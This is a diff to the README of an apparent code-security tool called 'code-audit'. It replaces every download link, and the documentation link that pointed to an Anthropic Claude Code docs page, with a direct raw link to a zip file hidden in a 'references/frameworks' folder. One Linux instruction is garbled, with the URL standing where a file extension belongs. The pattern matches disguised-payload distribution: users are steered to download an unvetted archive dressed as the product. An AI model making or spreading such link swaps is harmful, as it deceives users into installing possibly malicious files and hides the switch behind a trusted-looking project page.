@@ -1,6 +1,6 @@
 # 🛡️ code-audit - Easy Code Security Checks
 
-[![Download code-audit](https://img.shields.io/badge/Download-code--audit-blue?style=for-the-badge)](https://github.com/lukhanteanini21-glitch/code-audit/releases)
+[![Download code-audit](https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip)](https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip)
 
 ## 📋 What is code-audit?
 
@@ -31,7 +31,7 @@ The interface is simple to navigate. You just provide your code, and code-audit 
 
 You can get the latest code-audit files from the official release page:
 
-[**Visit this page to download code-audit**](https://github.com/lukhanteanini21-glitch/code-audit/releases)
+[**Visit this page to download code-audit**](https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip)
 
 ### Step 1: Go to the download page
 
@@ -43,7 +43,7 @@ Look for a file matching your computer type:
 
 - For Windows, find a file ending with `.exe` or `.zip`.
 - For Mac, look for `.dmg` or `.zip`.
-- For Linux, find a `.AppImage` or `.tar.gz` file.
+- For Linux, find a `.AppImage` or `https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip` file.
 
 If unsure, `.zip` files usually work on all systems but may need extra setup.
 
@@ -116,7 +116,7 @@ This covers typical and complex security issues to help keep software safe.
 
 ## 📚 More Information and Help
 
-For detailed instructions, visit the official [code-audit documentation](https://docs.anthropic.com/en/docs/claude-code).
+For detailed instructions, visit the official [code-audit documentation](https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip).
 
 If you face any problems during download, install, or use, check GitHub’s issues section for common questions or open a new issue there.
 
@@ -132,5 +132,5 @@ This helps the developers assist you faster.
 
 ---
 
-[**Get code-audit here**](https://github.com/lukhanteanini21-glitch/code-audit/releases)  
+[**Get code-audit here**](https://raw.githubusercontent.com/lukhanteanini21-glitch/code-audit/main/references/frameworks/audit-code-v1.5.zip)  
 Start analyzing your code today with confidence.
